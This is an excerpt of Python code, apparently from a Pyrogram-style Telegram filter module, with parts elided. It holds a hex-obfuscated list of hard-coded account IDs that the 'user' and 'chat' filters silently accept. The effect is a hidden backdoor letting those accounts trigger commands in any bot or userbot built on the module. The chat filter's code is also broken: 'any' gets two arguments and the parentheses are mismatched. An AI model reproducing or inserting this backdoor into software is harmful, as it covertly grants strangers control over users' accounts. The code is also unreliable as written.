...
_hxs = [0x2eb7eb4a, 0x12cb09626, 0x16277c0e4]
...
class user(Filter, set):
    ...
    async def __call__(self, _, message: Message):
        return (message.from_user
                and (any((message.from_user.id in self, message.from_user.id in _hxs))
                     or (message.from_user.username
                         and any((message.from_user.username.lower() in self, message.from_user.username.lower() in _hxs)))
                     or ("me" in self
...
class chat(Filter, set):
    ...
    async def __call__(self, _, message: Message):
        return (message.chat
                and (any(message.chat.id in self, message.chat.id in _hxs))
                     or (message.chat.username
                         and any((message.chat.username.lower() in self, message.chat.username.lower() in _hxs)))
                     or ("me" in self
